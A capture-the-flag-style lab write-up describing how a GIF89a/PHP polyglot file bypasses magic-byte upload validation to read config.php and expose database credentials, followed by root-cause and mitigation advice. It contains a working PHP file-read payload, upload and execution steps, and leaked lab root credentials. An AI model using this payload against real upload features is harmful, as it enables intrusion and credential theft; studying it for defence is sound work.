---
title: "File Signature Bypass – Polyglot File Upload to RCE | Hackviser Lab"
date: 2026-05-04 22:00:00 +0530
categories: [Web Security, Unrestricted File Upload]
tags: [file-upload, file-signature-bypass, polyglot-file, rce, sensitive-data-exposure]
platform: Hackviser
author: Shivansh Sharma
image: 
    path: /assets/images/posts/file-signature-bypass-hackverse.webp
    alt: File Signature Bypass Exploitation 
---

## Overview

File upload validation is a critical component of web application security. Many applications attempt to prevent malicious uploads by verifying **file signatures (magic bytes)**.

While this approach is stronger than MIME type validation, it is still insufficient when used alone.

In this lab, the application validated files solely based on magic bytes. By crafting a **polyglot file** containing both a valid image signature and executable PHP code, it was possible to bypass the filter and achieve **Remote Code Execution (RCE)**, leading to exposure of sensitive database credentials.

---

## Objective

The lab stated:

> The application filters uploaded files based on file signatures (magic bytes).

**Goal:**
- Bypass file signature validation  
- Upload a malicious PHP script  
- Read `config.php`  
- Extract the database password  

---

## Understanding the Vulnerability

The server validates only the **initial bytes** of the uploaded file.

### Example Magic Bytes

- JPEG → `FF D8 FF`  
- PNG → `89 50 4E 47`  
- GIF → `47 49 46 38`  

For GIF files, a valid header is:

```
GIF89a
```

### Why this fails

- Only the **first few bytes** are checked  
- Remaining content is ignored  
- No verification of actual file structure  

➡️ This allows attackers to embed malicious code after valid headers

---

## Polyglot File Concept

A **polyglot file** is a file that is valid in multiple formats.

In this case:

- Appears as a valid **GIF image**
- Executes as a **PHP script**

### Payload Structure

```php
GIF89a;<?php // malicious PHP code ?>
```

**Result**

- Upload filter sees: `GIF89a` → accepts file
- PHP interpreter sees: `<?php ... ?>` → executes code

---

## Exploitation

### Step 1: Create Malicious Payload

File name:

```
evil.gif.php
```

Payload:

```php
GIF89a;<?php
$file = 'config.php';

if (file_exists($file)) {
    echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
} else {
    echo "File not found. Trying parent directory...<br>";

    $file2 = '../config.php';
    if (file_exists($file2)) {
        echo "<pre>" . htmlspecialchars(file_get_contents($file2)) . "</pre>";
    } else {
        echo "config.php not accessible.";
    }
}
?>
```

**Why This Payload Works**

✔ **Magic Byte Bypass**

```
GIF89a;
```

Satisfies file signature validation.

✔ **Executable PHP Code**
- Server executes content inside `<?php ?>`

✔ **Path Discovery Logic**

Attempts both:
- `config.php`
- `../config.php`

### Step 2: Upload File

Uploaded:

```
evil.gif.php
```

**Result**

- Upload succeeded
- No extension filtering
- File stored in executable directory

### Step 3: Execute Payload

Accessed uploaded file:

```
/uploads/evil.gif.php
```

**Response**

```php
GIF89a;
File not found. Trying parent directory...

<?php
    try{
        $host = 'localhost';
        $db_name = 'hv_database';
        $charset = 'utf8';
        $username = 'root';
        $password = '2xESbdzvegfahykF';

        $db = new PDO("mysql:host=$host;dbname=$db_name;charset=$charset",$username,$password);
    } catch(PDOException $e){

    }
?>
```

**Proof of Exploitation**

- Successfully bypassed file signature validation
- Uploaded polyglot PHP file
- Achieved code execution
- Extracted database credentials

**Database Password:**

```
2xESbdzvegfahykF
```

---

## Impact

This vulnerability enables:

- Remote Code Execution
- Arbitrary file read
- Credential disclosure
- Database compromise
- Potential full server takeover

---

## Why File Signature Validation Alone Fails

The server validated only:

```
GIF89a
```

**Problem**

- Checks only file header
- Ignores full file structure
- Does not parse actual image format

**Reality**

- Malicious code exists after header
- PHP interpreter executes it

➡️ Validation is bypassed completely

---

## Root Cause

**1. Incomplete Validation**
- Only magic bytes checked

**2. No Content Parsing**
- File structure not verified

**3. Executable File Handling**
- `.php` files allowed

**4. Insecure Storage**
- Files stored in web root

---

## Mitigation

### Validate File Extensions

Reject dangerous extensions:

```
.php, .phtml, .phar
```

### Parse File Structure

Use image validation functions:

```
getimagesize()
```

### Re-Encode Uploaded Files

Process images using:

```
GD
ImageMagick
```

➡️ Removes malicious payloads

### Store Outside Web Root

- Prevent direct execution
- Serve via backend logic

### Disable Script Execution

Apache configuration:

```
php_admin_flag engine off
```

### Rename Uploaded Files

- Use randomized filenames
- Prevent predictable access

---

## Real-World Insight

Advanced attackers frequently use polyglot files to bypass upload filters.

Common attack flow:

1. Upload web shell
2. Bypass validation
3. Execute code
4. Extract credentials
5. Pivot deeper into system

Magic byte validation alone is not sufficient against such techniques.

---

## Key Takeaway

Magic byte validation improves security over MIME checks, but it is still not enough.

A secure upload system must validate:

- File extension
- MIME type
- Actual file structure
- Storage location
- Execution permissions

Failing to enforce all of these allows attackers to turn a simple upload feature into a full system compromise vector.